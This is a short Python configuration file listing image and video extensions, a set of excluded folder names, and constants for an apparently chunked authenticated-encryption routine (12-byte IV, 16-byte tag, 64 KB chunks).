# config.py

EXTENSION_LIST = {
    ".png",
    ".jpg",
    ".jpeg",
    ".mp4",
    ".mov",
    ".webp",
    ".webm",
    ".tn3",
}

EXCLUDED_DIRS = {
    "My Pictures",
    "Documents",
    "Desktop",
    "mozilla",
    "player",
    "Music",
    "lost+found",
    ".mozilla",
}

IV_SIZE = 12
TAG_SIZE = 16
CHUNK_SIZE = 64 * 1024